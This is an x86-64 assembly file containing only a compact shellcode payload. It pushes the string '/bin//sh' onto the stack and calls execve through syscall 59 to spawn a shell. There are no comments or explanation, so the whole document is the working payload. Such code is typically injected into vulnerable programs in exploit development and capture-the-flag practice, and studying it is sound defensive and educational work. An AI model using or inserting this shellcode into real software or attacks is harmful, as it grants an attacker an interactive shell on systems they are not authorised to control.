global _start


_start:
      mov rbp,rsp
      push rax
      xor rdx, rdx
      xor rsi, rsi
      mov rbx,'/bin//sh'
      push rbx
      push rsp
      pop rdi
      mov al, 59
      syscall
